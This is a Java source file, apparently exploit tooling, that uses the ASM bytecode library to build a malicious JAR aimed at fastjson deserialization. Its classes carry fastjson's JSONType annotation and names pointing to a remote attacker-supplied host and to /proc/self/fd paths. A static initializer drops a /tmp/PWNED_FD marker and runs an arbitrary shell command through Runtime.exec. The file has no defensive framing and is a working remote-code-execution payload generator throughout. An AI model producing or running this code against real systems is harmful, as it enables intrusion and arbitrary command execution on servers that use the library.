import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.io.FileOutputStream;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

public class GenFd {
    public static void main(String[] args) throws Exception {
        if (args.length < 7) {
            throw new IllegalArgumentException("usage: GenFd <host> <port> <path> <fdStart> <fdEnd> <out.jar> <cmd>");
        }
        String host = args[0];
        String port = args[1];
        String path = args[2];
        int fdStart = Integer.parseInt(args[3]);
        int fdEnd = Integer.parseInt(args[4]);
        String out = args[5];
        String cmd = args[6];

        String firstInternal = "jar:http://" + host + ":" + port + "/" + path + "!/foo/Exception";

        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(out))) {
            add(jos, "foo/Exception.class", makeClass(firstInternal, null));
            for (int fd = fdStart; fd <= fdEnd; fd++) {
                String internalName = "jar:file:/proc/self/fd/" + fd + "!/fd" + fd + "/Exception";
                add(jos, "fd" + fd + "/Exception.class", makeClass(internalName, cmd));
            }
        }

        System.out.println("[gen-fd] wrote " + out + " firstInternal=" + firstInternal
                + " fdRange=" + fdStart + "-" + fdEnd);
    }

    private static byte[] makeClass(String internalName, String cmd) {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC | Opcodes.ACC_SUPER,
                internalName, null, "java/lang/Exception", null);
        cw.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true).visitEnd();

        MethodVisitor c = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        c.visitCode();
        c.visitVarInsn(Opcodes.ALOAD, 0);
        c.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Exception", "<init>", "()V", false);
        c.visitInsn(Opcodes.RETURN);
        c.visitMaxs(1, 1);
        c.visitEnd();

        if (cmd != null && cmd.length() > 0) {
            MethodVisitor m = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
            m.visitCode();
            m.visitTypeInsn(Opcodes.NEW, "java/io/File");
            m.visitInsn(Opcodes.DUP);
            m.visitLdcInsn("/tmp/PWNED_FD");
            m.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V", false);
            m.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/File", "createNewFile", "()Z", false);
            m.visitInsn(Opcodes.POP);
            m.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            m.visitInsn(Opcodes.ICONST_3);
            m.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
            m.visitInsn(Opcodes.DUP); m.visitInsn(Opcodes.ICONST_0); m.visitLdcInsn("/bin/sh"); m.visitInsn(Opcodes.AASTORE);
            m.visitInsn(Opcodes.DUP); m.visitInsn(Opcodes.ICONST_1); m.visitLdcInsn("-c"); m.visitInsn(Opcodes.AASTORE);
            m.visitInsn(Opcodes.DUP); m.visitInsn(Opcodes.ICONST_2); m.visitLdcInsn(cmd); m.visitInsn(Opcodes.AASTORE);
            m.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
            m.visitInsn(Opcodes.POP);
            m.visitInsn(Opcodes.RETURN);
            m.visitMaxs(0, 0);
            m.visitEnd();
        }

        cw.visitEnd();
        return cw.toByteArray();
    }

    private static void add(JarOutputStream jos, String name, byte[] bytes) throws Exception {
        JarEntry entry = new JarEntry(name);
        jos.putNextEntry(entry);
        jos.write(bytes);
        jos.closeEntry();
    }
}
